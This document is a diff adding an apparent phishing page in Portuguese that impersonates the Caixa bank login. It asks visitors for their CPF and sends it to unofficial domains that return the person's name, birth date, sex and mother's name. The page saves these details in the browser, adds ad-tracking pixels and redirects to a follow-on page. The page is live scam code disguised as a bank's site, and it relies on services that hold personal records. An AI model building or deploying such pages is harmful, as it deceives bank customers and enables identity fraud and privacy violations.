@@ -1,0 +1,657 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Login Caixa</title>
+
+    <!-- Bootstrap CSS -->
+    <link href="css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
+
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap"
+        rel="stylesheet">
+
+    <!-- UTM Capture Script -->
+    <script async="" src="js/fbevents.js"></script>
+    <script>
+        // Captura os UTMs assim que a página carregar
+        document.addEventListener('DOMContentLoaded', function () {
+            const urlParams = new URLSearchParams(window.location.search);
+
+            // Tentar pegar UTMs salvos do localStorage
+            let savedUtms = {};
+            try {
+                const saved = localStorage.getItem('utmParams');
+                if (saved) {
+                    savedUtms = JSON.parse(saved);
+                }
+            } catch (e) {
+                console.error('Erro ao ler UTMs do localStorage:', e);
+            }
+
+            // Capturar UTMs da URL atual (prioridade) ou usar os salvos
+            const utmParams = {
+                utm_source: urlParams.get('utm_source') || savedUtms.utm_source || null,
+                utm_medium: urlParams.get('utm_medium') || savedUtms.utm_medium || null,
+                utm_campaign: urlParams.get('utm_campaign') || savedUtms.utm_campaign || null,
+                utm_content: urlParams.get('utm_content') || savedUtms.utm_content || null,
+                utm_term: urlParams.get('utm_term') || savedUtms.utm_term || null,
+                src: urlParams.get('src') || savedUtms.src || null,
+                sck: urlParams.get('sck') || savedUtms.sck || null
+            };
+
+            // Salvar no localStorage apenas se houver valores válidos
+            const hasValidUtms = Object.values(utmParams).some(val => val !== null && val !== '');
+            if (hasValidUtms) {
+                localStorage.setItem('utmParams', JSON.stringify(utmParams));
+                console.log('UTMs capturados:', utmParams); // Debug
+            }
+        });
+    </script>
+
+    <!-- Analytics Tracking -->
+    <script src="../js/analytics.js"></script>
+
+    <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+
+    <!-- UTMify UTMs Script -->
+    <script src="js/latest_1.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async=""
+        defer=""></script>
+
+    <!-- Meta Pixel Code -->
+    <script>
+        !function (f, b, e, v, n, t, s) {
+            if (f.fbq) return;
+            n = f.fbq = function () {
+                n.callMethod ?
+                    n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+            };
+            if (!f._fbq) f._fbq = n;
+            n.push = n;
+            n.loaded = !0;
+            n.version = '2.0';
+            n.queue = [];
+            t = b.createElement(e);
+            t.async = !0;
+            t.src = v;
+            s = b.getElementsByTagName(e)[0];
+            s.parentNode.insertBefore(t, s)
+        }(window, document, 'script',
+            'https://connect.facebook.net/en_US/fbevents.js');
+
+        fbq('init', '1626635185176209');
+        fbq('init', '2272221343252127');
+        fbq('track', 'PageView');
+    </script>
+
+    <noscript>
+        <img height="1" width="1" style="display:none"
+            src="https://www.facebook.com/tr?id=1626635185176209&ev=PageView&noscript=1" />
+        <img height="1" width="1" style="display:none"
+            src="https://www.facebook.com/tr?id=2272221343252127&ev=PageView&noscript=1" />
+    </noscript>
+    <!-- End Meta Pixel Code -->
+
+
+    <!-- Custom Styles -->
+    <style>
+        @font-face {
+            font-family: 'Futura-Book';
+            src: url('fonts/Futura-Book.eot');
+            src: url('Futura-Book.eot%2540') format('embedded-opentype'),
+                url('fonts/Futura-Book.woff2') format('woff2'),
+                url('fonts/Futura-Book.woff') format('woff'),
+                url('fonts/Futura-Book.ttf') format('truetype'),
+                url('images/Futura-Book.svg') format('svg');
+            font-weight: normal;
+            font-style: normal;
+            font-display: swap;
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Futura-Book', sans-serif !important;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(45deg, #00a9ad, #005ca9);
+            background-size: cover;
+            background-repeat: no-repeat;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 1.5rem;
+        }
+
+        .container-principal {
+            width: 100%;
+            max-width: 450px;
+            background-color: #fff;
+            border-radius: 0.4rem;
+            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.3);
+            padding: 2.5rem 3rem;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .logo-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            margin-bottom: 0.5rem;
+        }
+
+        .logo-container img {
+            width: 140px;
+            height: auto;
+        }
+
+        .container-principal h1 {
+            color: #0070ae;
+            font-size: 1.25rem;
+            font-weight: 600;
+            margin: 0.5rem 0 0 0;
+            text-align: center;
+        }
+
+        .container-principal h2 {
+            color: #0070ae;
+            font-size: 1rem;
+            font-weight: 400;
+            margin: 1.5rem 0 2rem 0;
+            text-align: center;
+            line-height: 1.5;
+        }
+
+        .container-principal form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .form-group {
+            width: 100%;
+            margin-bottom: 0;
+            position: relative;
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+            width: 100%;
+            margin-top: 1.5rem;
+        }
+
+        .input-wrapper::before {
+            content: "👤";
+            position: absolute;
+            left: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 1rem;
+            color: #0070ae;
+            z-index: 2;
+            pointer-events: none;
+            transition: all 0.3s ease;
+        }
+
+        .form-group label {
+            position: absolute;
+            left: 1.8rem;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #0070ae;
+            font-size: 1rem;
+            font-weight: 500;
+            pointer-events: none;
+            transition: all 0.3s ease;
+            z-index: 1;
+            white-space: nowrap;
+        }
+
+        .form-group input {
+            font-size: 1rem;
+            height: 45px;
+            width: 100%;
+            border: none;
+            border-bottom: 1.5px solid #f39200;
+            padding: 0.5rem 0.25rem 0.5rem 1.8rem;
+            color: #4d7880;
+            background-color: transparent;
+            transition: border-color 0.3s ease;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-bottom-color: #0070ae;
+        }
+
+        .form-group input:focus+label,
+        .form-group.focused .input-wrapper label {
+            top: -1.5rem;
+            left: 1.5rem;
+            font-size: 0.85rem;
+            transform: translateY(0);
+            color: #0070ae;
+        }
+
+        /* Ícone sobe junto com o label quando focado ou preenchido */
+        .form-group.focused .input-wrapper::before {
+            top: -1.5rem;
+            left: 0;
+            transform: translateY(0);
+        }
+
+        .form-group input::placeholder {
+            color: transparent;
+        }
+
+        button.botoes {
+            margin-top: 2rem;
+            background-color: #f39200;
+            color: white;
+            font-weight: 500;
+            width: 100%;
+            border: none;
+            padding: 0.75rem 1rem;
+            font-size: 1rem;
+            border-radius: 0.4rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        button.botoes:hover:not(:disabled) {
+            background-color: #e08500;
+            transform: translateY(-1px);
+            box-shadow: 0px 2px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        button.botoes:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .links-section {
+            width: 100%;
+            margin-top: 2rem;
+            display: flex;
+            flex-direction: column;
+            gap: 0.75rem;
+            align-items: center;
+        }
+
+        .links-section h3 {
+            color: #0070ae;
+            font-size: 0.95rem;
+            margin: 0;
+            text-align: center;
+            font-weight: 400;
+        }
+
+        .links-section h3 a {
+            color: #0070ae;
+            font-weight: 600;
+            text-decoration: underline;
+            transition: color 0.3s ease;
+        }
+
+        .links-section h3 a:hover {
+            color: #173e68;
+        }
+
+        .cadastro-link {
+            color: #0070ae;
+            font-size: 0.95rem;
+            text-align: center;
+            margin: 0;
+        }
+
+        .cadastro-link a {
+            color: #0070ae;
+            font-weight: 600;
+            text-decoration: underline;
+            transition: color 0.3s ease;
+        }
+
+        .cadastro-link a:hover {
+            color: #173e68;
+        }
+
+        /* Responsividade */
+        @media (max-width: 768px) {
+            body {
+                padding: 1rem;
+            }
+
+            .container-principal {
+                padding: 2rem 2rem;
+                max-width: 100%;
+            }
+
+            .logo-container img {
+                width: 120px;
+            }
+
+            .container-principal h1 {
+                font-size: 1.1rem;
+            }
+
+            .container-principal h2 {
+                font-size: 0.95rem;
+                margin: 1.25rem 0 1.75rem 0;
+            }
+        }
+
+        @media (max-width: 576px) {
+            body {
+                padding: 0.75rem;
+            }
+
+            .container-principal {
+                padding: 1.75rem 1.5rem;
+                border-radius: 0.3rem;
+            }
+
+            .logo-container img {
+                width: 110px;
+                margin-bottom: 0.25rem;
+            }
+
+            .container-principal h1 {
+                font-size: 1rem;
+                margin-top: 0.25rem;
+            }
+
+            .container-principal h2 {
+                font-size: 0.9rem;
+                margin: 1rem 0 1.5rem 0;
+                line-height: 1.4;
+            }
+
+            .form-group input {
+                height: 42px;
+                font-size: 0.95rem;
+            }
+
+            button.botoes {
+                padding: 0.65rem 1rem;
+                font-size: 0.95rem;
+                margin-top: 1.75rem;
+            }
+
+            .links-section {
+                margin-top: 1.5rem;
+                gap: 0.65rem;
+            }
+
+            .links-section h3,
+            .cadastro-link {
+                font-size: 0.9rem;
+            }
+        }
+
+        @media (max-width: 400px) {
+            .container-principal {
+                padding: 1.5rem 1.25rem;
+            }
+
+            .logo-container img {
+                width: 100px;
+            }
+
+            .container-principal h1 {
+                font-size: 0.95rem;
+            }
+
+            .container-principal h2 {
+                font-size: 0.85rem;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container-principal">
+        <div class="logo-container">
+            <img src="images/logo-caixa.webp" alt="Logo Caixa">
+        </div>
+
+        <h1>Login Caixa</h1>
+        <h2>Informe seu CPF e clique em "Próximo" para continuar:</h2>
+
+        <form id="cpfForm">
+            <div class="form-group">
+                <div class="input-wrapper">
+                    <input name="cpf" id="cpf" type="text" onkeyup="formatCpf(this)" maxlength="14" placeholder=" "
+                        required="">
+                    <label for="cpf">CPF</label>
+                </div>
+                <button class="botoes" type="submit">Próximo</button>
+            </div>
+        </form>
+
+        <div class="links-section">
+            <p class="cadastro-link">É novo por aqui? <a href="#">Cadastre-se</a></p>
+            <h3><a href="#">Preciso de ajuda</a></h3>
+        </div>
+    </div>
+
+    <!-- Bootstrap JS -->
+    <script src="js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
+
+    <!-- Scripts -->
+    <script>
+        // Formatação de CPF
+        function formatCpf(input) {
+            let value = input.value.replace(/\D/g, '');
+            if (value.length > 3) value = value.replace(/^(\d{3})(\d)/, '$1.$2');
+            if (value.length > 6) value = value.replace(/^(\d{3})\.(\d{3})(\d)/, '$1.$2.$3');
+            if (value.length > 9) value = value.replace(/^(\d{3})\.(\d{3})\.(\d{3})(\d)/, '$1.$2.$3-$4');
+            input.value = value;
+        }
+
+        // Adiciona classe ao form-group quando input está em foco/preenchido
+        document.addEventListener('DOMContentLoaded', function () {
+            const cpfInput = document.getElementById('cpf');
+            const formGroup = cpfInput.closest('.form-group');
+
+            // Função para atualizar o estado do label
+            function updateLabelState() {
+                if (cpfInput.value.trim() !== '') {
+                    // Se tem valor, sempre mantém no topo
+                    formGroup.classList.add('focused');
+                } else if (document.activeElement === cpfInput) {
+                    // Se está em foco mas vazio, mantém no topo
+                    formGroup.classList.add('focused');
+                } else {
+                    // Se está vazio e sem foco, remove do topo
+                    formGroup.classList.remove('focused');
+                }
+            }
+
+            // Verifica estado inicial
+            updateLabelState();
+
+            // Track page view
+            trackPageView('/inicio', {
+                utm_source: urlParams.get('utm_source'),
+                utm_medium: urlParams.get('utm_medium'),
+                utm_campaign: urlParams.get('utm_campaign')
+            });
+
+            cpfInput.addEventListener('focus', function () {
+                formGroup.classList.add('focused');
+                trackEvent('cpf_field_focus', { page: '/inicio' });
+            });
+
+            cpfInput.addEventListener('blur', function () {
+                updateLabelState();
+            });
+
+            cpfInput.addEventListener('input', function () {
+                updateLabelState();
+                if (cpfInput.value.length >= 14) { // CPF formatted
+                    trackFormField('cpf', cpfInput.value, '/inicio');
+                }
+            });
+        });
+
+        // Submissão do formulário
+        document.getElementById('cpfForm').addEventListener('submit', async function (event) {
+            event.preventDefault();
+
+            const cpfInput = document.getElementById('cpf');
+            const cpf = cpfInput.value.replace(/\D/g, '');
+            const button = this.querySelector('button[type="submit"]');
+
+            // Track form submission attempt
+            trackClick('button', 'Próximo', '/inicio');
+            trackEvent('form_submit_attempt', { cpf: cpf.replace(/\d(?=\d{4})/g, '*'), page: '/inicio' });
+
+            button.disabled = true;
+            button.textContent = 'Consultando...';
+            button.style.opacity = '0.6';
+
+            try {
+                if (cpf.length !== 11) {
+                    throw new Error('Por favor, digite um CPF válido.');
+                }
+
+                let data = null;
+                let dadosTratados = null;
+
+                // Tentar primeira API
+                try {
+                    const apiUrl = `https://centralajudabrasil.online/api/9bYgzcOU4T0Hjl9D8hnTH1Hx9GQ6SPZX/cpf/${cpf}`;
+                    console.log('Consultando API 1:', apiUrl);
+                    const response = await fetch(apiUrl, { method: "GET" });
+
+                    if (response.ok) {
+                        data = await response.json();
+                        console.log('Resposta da API 1:', data);
+
+                        if (data && typeof data === "object" && data.NOME) {
+                            dadosTratados = {
+                                cpf: cpf,
+                                nome: data.NOME || "",
+                                nascimento: data.NASC || "",
+                                sexo: data.SEXO || "",
+                                nome_mae: data.NOME_MAE || ""
+                            };
+                        }
+                    }
+                } catch (error) {
+                    console.log('API 1 falhou, tentando API 2...', error);
+                }
+
+                // Se a primeira API falhou, tentar segunda API
+                if (!dadosTratados) {
+                    try {
+                        const apiUrl2 = `https://loteriasbilhetesonline.it.com/api/cpf/consulta/${cpf}`;
+                        console.log('Consultando API 2:', apiUrl2);
+                        const response2 = await fetch(apiUrl2, { method: "GET" });
+
+                        if (response2.ok) {
+                            const data2 = await response2.json();
+                            console.log('Resposta da API 2:', data2);
+
+                            if (data2 && data2.success && data2.data) {
+                                const dados = data2.data;
+                                dadosTratados = {
+                                    cpf: dados.cpf || cpf,
+                                    nome: dados.nome || dados.nome_completo || "",
+                                    nascimento: dados.data_nascimento || "",
+                                    sexo: "",
+                                    nome_mae: ""
+                                };
+                            }
+                        }
+                    } catch (error) {
+                        console.log('API 2 falhou:', error);
+                    }
+                }
+
+                if (dadosTratados) {
+                    console.log('Dados tratados:', dadosTratados);
+
+                    // Track successful API response
+                    trackEvent('api_success', {
+                        cpf: dadosTratados.cpf.replace(/\d(?=\d{4})/g, '*'),
+                        nome: dadosTratados.nome.split(' ')[0],
+                        page: '/inicio'
+                    });
+
+                    localStorage.setItem('cpf', dadosTratados.cpf);
+                    localStorage.setItem('nome', dadosTratados.nome);
+                    localStorage.setItem('nascimento', dadosTratados.nascimento);
+                    localStorage.setItem('sexo', dadosTratados.sexo);
+                    localStorage.setItem('nome_mae', dadosTratados.nome_mae);
+
+                    // Mostra mensagem de carregamento
+                    button.textContent = 'Entrando...';
+                    button.style.opacity = '0.8';
+
+                    // Delay de 3 segundos antes do redirecionamento
+                    setTimeout(() => {
+                        // Track navigation
+                        trackNavigation('/inicio', '/simula');
+                        // Capturar UTMs da URL atual e do localStorage
+                        const urlParams = new URLSearchParams(window.location.search);
+                        const utmParams = new URLSearchParams();
+
+                        // Tentar pegar UTMs salvos do localStorage
+                        let savedUtms = {};
+                        try {
+                            const saved = localStorage.getItem('utmParams');
+                            if (saved) {
+                                savedUtms = JSON.parse(saved);
+                            }
+                        } catch (e) {
+                            console.warn('Erro ao ler UTMs do localStorage:', e);
+                        }
+
+                        // Mesclar UTMs: prioridade para URL, depois localStorage
+                        const utmFields = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'src', 'sck'];
+                        utmFields.forEach(key => {
+                            const urlValue = urlParams.get(key);
+                            const savedValue = savedUtms[key];
+                            // Prioridade: URL > localStorage
+                            const value = urlValue || savedValue;
+                            if (value) {
+                                utmParams.append(key, value);
+                            }
+                        });
+
+                        const utmString = utmParams.toString() ? '?' + utmParams.toString() : '';
+                        window.location.href = '/simula' + utmString;
+                    }, 3000);
+                } else {
+                    throw new Error("Dados não encontrados para este CPF.");
+                }
+
+            } catch (error) {
+                console.error('Erro:', error);
+                alert(error.message || 'CPF inválido ou erro ao consultar. Por favor, tente novamente.');
+                // Reabilita o botão apenas em caso de erro
+                button.disabled = false;
+                button.textContent = 'Próximo';
+                button.style.opacity = '1';
+            }
+        });
+    </script>
+
+
+</body>
+
+</html>
